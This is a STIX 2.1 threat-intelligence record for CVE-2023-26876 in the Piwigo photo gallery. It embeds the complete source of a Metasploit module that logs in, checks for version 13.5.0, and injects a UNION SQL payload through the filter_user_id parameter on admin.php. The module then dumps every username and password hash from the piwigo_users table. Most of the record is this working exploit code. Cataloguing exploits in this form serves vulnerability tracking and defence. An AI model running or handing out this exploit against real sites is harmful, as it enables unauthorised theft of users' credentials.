{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--67b2b5a1-89d9-4b5e-bba1-fb11a68f5848",
    "created": "2024-08-14T16:31:55.246662Z",
    "modified": "2024-08-14T16:31:55.246667Z",
    "name": "Piwigo CVE-2023-26876 Gather Credentials via SQL Injection ",
    "description": " This module allows an authenticated user to retrieve the usernames and encrypted passwords of other users in Piwigo through SQL injection using the (filter_user_id) parameter. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/piwigo_cve_2023_26876.rb",
            "external_id": "piwigo_cve_2023_26876.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-26876"
        },
        {
            "source_name": "reference",
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-26876"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::SQLi\n  prepend Msf::Exploit::Remote::AutoCheck\n  require 'metasploit/framework/hashes'\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Piwigo CVE-2023-26876 Gather Credentials via SQL Injection ',\n        'Description' => %q{\n          This module allows an authenticated user to retrieve the usernames and encrypted passwords of other users in Piwigo through SQL injection using the (filter_user_id) parameter.\n        },\n        'Author' => [\n          'rodnt', # metasploit module\n          'Rodolfo Tavares', # vulnerability discovery\n          'Tempest Security, Henrique Arcoverde' # special thanks\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'CVE', '2023-26876' ],\n          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2023-26876'],\n        ],\n        'DisclosureDate' => '2023-04-21',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [IOC_IN_LOGS],\n          'Reliability' => []\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, 'The base path to Piwigo', '/' ]),\n        OptString.new('USERNAME', [ true, 'The username for authenticating to Piwigo', 'piwigo' ]),\n        OptString.new('PASSWORD', [ true, 'The password for authenticating to Piwigo', 'piwigo' ])\n      ]\n    )\n  end\n\n  def check\n    login_page = target_uri.path.end_with?('index.php') ? normalize_uri(target_uri.path) : normalize_uri(target_uri.path, '/index.php')\n\n    res = send_request_cgi(\n      'method' => 'GET',\n      'keep_cookies' => true,\n      'uri' => login_page\n    )\n\n    if res && res.code == 200 && res.body.match(%r{themes/default/js/jquery.min.js\\?v13.5.0})\n      return Exploit::CheckCode::Appears('The target is running Piwigo with version 13.5.0')\n    else\n      return Exploit::CheckCode::Safe('The target does not appear to be running Piwigo with vulnerable version')\n    end\n  rescue ::Rex::ConnectionError\n    return Exploit::CheckCode::Unknown(\"#{peer} - Connection failed\")\n  end\n\n  def login\n    login_uri = target_uri.path.end_with?('identification.php') ? normalize_uri(target_uri.path) : normalize_uri(target_uri.path, '/identification.php')\n    print_status('Try to log in..')\n\n    login_res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => login_uri,\n      'keep_cookies' => true,\n      'vars_post' => {\n        'username' => datastore['USERNAME'],\n        'password' => datastore['PASSWORD'],\n        'login' => 'Login'\n      }\n    )\n\n    if login_res.code != 302 || login_res.body.include?('Invalid username or password!')\n      fail_with(Failure::NoAccess, \"Couldn't log into Piwigo\")\n    end\n\n    print_good('Successfully logged into Piwigo')\n  end\n\n  def test_vulnerable(response)\n    body_response = response.body.to_s\n    if body_response.include?('var filter_user_name = \"pwn3d\";')\n      print_good('Target is vulnerable')\n      return true\n    else\n      print_error('Target is NOT vulnerable')\n      return false\n    end\n  end\n\n  def dump_data(sqli)\n    creds_table = Rex::Text::Table.new(\n      'Header' => 'Piwigo Users',\n      'Indent' => 1,\n      'Columns' => ['username', 'hash']\n    )\n    results = sqli.run_sql('select group_concat(cast(concat_ws(0x3b,ifnull(username,repeat(0x31,0)),ifnull(password,repeat(0xd,0))) as binary)) from piwigo_users')\n\n    body_results = results.body.to_s\n    match = body_results.match(/var filter_user_name = \"(.*?)\";/)\n    if match\n      data = match[1]\n      data.split(',').each do |user_and_pw|\n        user, hash = user_and_pw.split(';', 2)\n\n        creds_table << [user, hash]\n        create_credential({\n          workspace_id: myworkspace_id,\n          origin_type: :service,\n          module_fullname: fullname,\n          username: user,\n          private_type: :nonreplayable_hash,\n          jtr_format: Metasploit::Framework::Hashes.identify_hash(hash),\n          private_data: user,\n          service_name: 'piwigo',\n          address: datastore['RHOST'],\n          port: datastore['RPORT'],\n          protocol: 'tcp',\n          status: Metasploit::Model::Login::Status::UNTRIED\n        })\n      end\n      rows_data = creds_table.rows.length\n      if rows_data > 1\n        print_status(\"Dump of usernames and hashes:\\n\")\n        print_line creds_table.to_s\n      end\n    end\n  end\n\n  def get_info\n    sqli = create_sqli(dbms: MySQLi::Common, opts: { hex_encode_strings: true }) do |payload|\n      send_request_cgi({\n        'method' => 'GET',\n        'uri' => normalize_uri(target_uri.path, 'admin.php'),\n        'vars_get' => {\n          'page' => 'history',\n          'filter_image_id' => '1',\n          'filter_user_id' => \"123123123 union all #{payload}\"\n        }\n      })\n    end\n\n    if test_vulnerable(sqli.run_sql('select 0x70776e3364'))\n      dump_data(sqli)\n    end\n  end\n\n  def run\n    login\n    get_info\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-04-21"
}